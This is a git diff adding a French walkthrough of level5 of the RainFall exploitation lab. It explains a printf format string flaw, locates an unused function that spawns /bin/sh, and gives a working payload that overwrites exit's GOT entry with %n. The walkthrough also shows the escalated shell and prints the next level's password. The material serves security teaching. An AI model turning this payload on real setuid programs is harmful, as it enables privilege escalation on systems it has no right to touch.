@@ -1,3 +1,34 @@
+# LEVEL5
+
+Le système de fichier se présente de cette manière:
+
+``` bash
+level5@RainFall:~$ ls -la
+total 17
+dr-xr-x---+ 1 level5 level5   80 Mar  6  2016 .
+dr-x--x--x  1 root   root    340 Sep 23  2015 ..
+-rw-r--r--  1 level5 level5  220 Apr  3  2012 .bash_logout
+-rw-r--r--  1 level5 level5 3530 Sep 23  2015 .bashrc
+-rwsr-s---+ 1 level6 users  5385 Mar  6  2016 level5
+-rw-r--r--+ 1 level5 level5   65 Sep 23  2015 .pass
+-rw-r--r--  1 level5 level5  675 Apr  3  2012 .profile
+```
+
+Le fichier level5 est un exécutable.
+
+Le bit SUID est activé, l'utilisateur level5 peut exécuter le programme avec les droits de level6.
+
+Le programme attend une string qu'il print sur stdout :
+``` bash
+level5@RainFall:~$ ./level5
+AAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAA
+```
+
+En examinant le code assembleur avec gdb, on comprend que le programme fait un appel à la fonction sécurisée `fgets` puis print son buffer avec `printf`.
+
+L'appel est effectué sous la forme `printf(buffer)` et non `printf("%s", buffer)`. Le contenu contrôlé par l'utilisateur devient donc directement la chaîne de format de printf. Il est alors possible d'utiliser les spécificateurs `%x`, `%p`, `%s` ou `%n`, ce qui constitue une vulnérabilité de type format string.
+
 ``` bash
 (gdb) disas main
 Dump of assembler code for function main:
@@ -25,6 +56,26 @@ Dump of assembler code for function n:
    0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1
    0x080484ff <+61>:	call   0x80483d0 <exit@plt>
 End of assembler dump.
+```
+
+En examinant les fonctions du programme avec gdb on note l'existance d'une fonction `o` jamais appelée:
+
+``` diff
+(gdb) info functions
+All defined functions:
+
+[...]
+
++ 0x080484a4  o
+0x080484c2  n
+0x08048504  main
+
+[...]
+```
+
+La fonction `o` fait un appel `system`,  avec comme argument "/bin/sh".
+
+``` bash
 (gdb) disas o
 Dump of assembler code for function o:
    0x080484a4 <+0>:	push   ebp
@@ -36,42 +87,59 @@ Dump of assembler code for function o:
    0x080484bd <+25>:	call   0x8048390 <_exit@plt>
 End of assembler dump.
 
+(gdb) x/s 0x80485f0
+0x80485f0:	 "/bin/sh"
 ```
-```
+
+La fonction `o()` est présente dans le binaire, mais aucune instruction du programme ne la référence. Elle est donc inatteignable dans le déroulement normal de l'exécution. Pour l'exécuter malgré tout, il faut détourner le flux de contrôle vers son adresse. La vulnérabilité de format string nous permet justement d'écrire une valeur arbitraire en mémoire grâce au spécificateur %n. Une cible idéale est alors l'entrée GOT de exit, puisque `n()` appelle systématiquement `exit(1)` juste après le printf vulnérable. En remplaçant l'adresse de exit par celle de o(), l'appel à exit exécutera en réalité `o()`.
+
+``` bash
 0x080484a4  o                    # == 134513828
 0x080483d0  exit
 0x080483d0  exit@plt
-
 ```
+
+On desassemble la fonction `exit@plt` pour voir l'adresse sur laquelle on jump pour l'exécuter.
 
 ``` bash
 (gdb) disas exit
 Dump of assembler code for function exit@plt:
-   0x080483d0 <+0>:	jmp    *0x8049838
-   0x080483d6 <+6>:	push   $0x28
-   0x080483db <+11>:	jmp    0x8048370
+   0x080483d0 <+0>:	jmp    *0x8049838             # saute à l'adresse contenue dans la case GOT 0x8049838
+   0x080483d6 <+6>:	push   $0x28                  
+   0x080483db <+11>:	jmp    0x8048370              # saute vers le linker dynamique (ld.so) pour résoudre l'adresse
 End of assembler dump.
 ```
 
-(gdb) run < <(python2 -c 'print "AAAA" + "%08x-" * 15')
-Starting program: /home/user/level5/level5 < <(python2 -c 'print "AAAA" + "%08x-" * 15')
-AAAA00000200-b7fd1ac0-b7ff37d0-41414141-78383025-3830252d-30252d78-252d7838-2d783830-78383025-3830252d-30252d78-252d7838-2d783830-78383025-
+`@plt` correspond à une série d'instruction assembleur qui permet de faire le relais avec la fonction `exit` de la libc.
 
+A `exit+0` l'étoile `*` signifie saut indirect, on ne saute pas à l'adresse elle-même, on saute vers l'adresse contenue à l'intérieur de la case mémoire `0x8049838`.
 
-"\x38\x98\x04\x08" + "%134513828d%4$n"
+`0x8049838` désigne l'emplacement fixe de l'entrée GOT pour `exit`.
 
+On va modifier l'adresse sur laquelle pointe `0x8049838` pour qu'elle corresponde à l'adresse de `o` (`0x080484a4`).
+Pour cela on va utiliser le spécificateur de `printf` `%n`. Le spécificateur `%n` n'affiche rien. À la place, il écrit dans l'adresse pointée par son argument le nombre de caractères déjà imprimés par printf
 
-Global Offset Table = GOT
+Pour cela on va convertir `o` en décimal. 
+`0x080484a4` en hexa correspond à `134513828` en décimal.
+On va écrire l'adresse de l'entrée GOT de `exit` en premier argument en little endian (`\x38\x98\x04\x08`).
 
-offset de 4 word
+Le payload final s'écrit donc : l'adresse GOT ciblée (`\x38\x98\x04\x08`), suivie d'un padding de largeur 134513824 (soit 134513828, la valeur décimale de l'adresse de `o`, moins les 4 octets déjà émis par l'écriture de l'adresse elle-même), puis `%4$n` pour effectuer l'écriture à la position repérée précédemment.
 
-1) trouver adresse de GOT[exit]
-2) l'ecrire au 4eme mot 
-3) calculer la correspondence en decimal de l'adresse de o (0x080484a4) et mettre sa valeur dans l'adresse pointee par exit
+Puis on cible l'endroit où commence l'argument du printf avec le spécificateur `%x` 
+
+``` bash
+level5@RainFall:~$ echo $(python2 -c "print 'AAAA' + '%x-' *10") |./level5
+AAAA200-b7fd1ac0-b7ff37d0-41414141-252d7825-78252d78-2d78252d-252d7825-78252d78-2d78252d-
+```
+
+Les quatre A apparaissent comme quatrième argument interprété par printf. L'adresse placée au début du payload sera donc également vue comme le quatrième argument, d'où l'utilisation de %4$n.
+
+Voici donc notre exploit sous la forme d'un petit script python:
 
 
 ``` bash
 (echo $(python2 -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"'); cat) | ./level5
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       512
 
 id
 uid=2045(level5) gid=2045(level5) euid=2064(level6) egid=100(users) groups=2064(level6),100(users),2045(level5)
@@ -79,3 +147,10 @@ uid=2045(level5) gid=2045(level5) euid=2064(level6) egid=100(users) groups=2064(
 cat /home/user/level6/.pass
 d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
 ```
+
+On peut décomposer notre commande de cette manière :
+- On place en début de chaîne l'adresse de l'entrée GOT de exit (`0x8049838`) en little endian (`\x38\x98\x04\x08`). Cette adresse deviendra le premier argument manipulé par %n
+- `%134513824d` demande à printf d'afficher un entier avec une largeur minimale de 134513824 caractères. Comme l'entier effectivement lu sur la pile est très petit (512 dans notre cas), printf complète l'affichage avec des espaces. Au total, 134513824 caractères sont imprimés, ce qui permet à `%n` d'écrire exactement la valeur souhaitée.
+La valeur affichée (512 ici) dépend simplement de ce qui se trouve à cet emplacement de la pile. Elle n'a aucune importance : seule la largeur du champ nous intéresse.
+- `%4$n` permet de désigner le 4ème argument affiché par printf pour modifier la valeur sur lequel il pointe en écrivant les octets jusque-là écrits en mémoire.
+
